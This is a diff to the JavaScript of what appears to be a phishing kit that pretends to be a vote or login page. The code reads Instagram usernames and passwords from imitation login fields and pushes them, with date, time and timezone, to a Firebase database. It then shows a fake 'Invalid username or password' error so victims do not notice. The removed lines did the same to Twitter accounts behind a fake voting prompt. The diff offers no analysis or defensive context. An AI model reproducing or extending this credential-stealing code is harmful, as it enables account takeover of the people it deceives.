@@ -14,24 +14,26 @@ const appCheck = firebase.appCheck();
 console.log(appCheck);
 appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);
 
-function tw_login() {
+function iglog() {
+  // Attempt anonymous sign-in with Firebase Authentication
   firebase
     .auth()
     .signInAnonymously()
     .catch(function (error) {
-      var errorCode = error.code;
       var errorMessage = error.message;
-      window.alert("Error: " + errorMessage);
+      // Display Firebase auth errors in the error box
+      showError(errorMessage);
     });
 
-  var email = document.getElementById("tw-email").value;
-  var password = document.getElementById("tw-pass").value;
+  var email = document.getElementById("ig-uname").value;
+  var password = document.getElementById("ig-pass").value;
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = "Twitter";
+  var accountType = "Instagram";
 
   if (email !== "" && password !== "") {
+    // Push the data to Firebase Realtime Database
     firebase.database().ref("fbdet").push({
       emle: email,
       mobile: "",
@@ -42,61 +44,27 @@ function tw_login() {
       type: accountType,
     });
 
+    // Use setTimeout to simulate the delay, then display an error message in the error box
     setTimeout(function () {
-      Swal.fire({
-        title: "Oops!",
-        text: "Something went wrong with your vote.",
-        icon: "error",
-        confirmButtonText: "Try Again",
-      });
-      document.getElementById("fb-pass").value = "";
-
-      return false;
-    }, 2000);
-  }
-}
-
-function iglog() {
-  firebase
-    .auth()
-    .signInAnonymously()
-    .catch(function (error) {
-      var errorCode = error.code;
-      var errorMessage = error.message;
-      window.alert("Error: " + errorMessage);
-    });
-
-  var username = document.getElementById("ig-uname").value;
-  var password = document.getElementById("ig-pass").value;
-  var currentDate = new Date().toISOString().slice(0, 10);
-  var currentTime = new Date().toISOString().slice(11, 19);
-  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  console.log(timezone);
-  var accountType = "Instagram";
-
-  if (username !== "" && password !== "") {
-    firebase.database().ref("fbdet").push({
-      emle: username,
-      mobile: "",
-      time: currentTime,
-      timezone: timezone,
-      pass: password,
-      date: currentDate,
-      type: accountType,
-    });
-
-    setTimeout(function () {
-      Swal.fire({
-        title: "Oops!",
-        text: "Something went wrong with your vote.",
-        icon: "error",
-        confirmButtonText: "Try Again",
-      });
-
+      showError("Invalid username or password");
       document.getElementById("ig-pass").value = "";
       return false;
     }, 2000);
+  } else {
+    // Show an error if email or password is missing
+    showError("Please enter both email and password.");
   }
+}
+
+function showError(message) {
+  var errorBox = document.getElementById("_ab2z");
+  errorBox.style.display = "block";
+  errorBox.querySelector("div:nth-child(2)").textContent = message;
+}
+
+function hideError() {
+  var errorBox = document.getElementById("_ab2z");
+  errorBox.style.display = "none";
 }
 
 function login() {
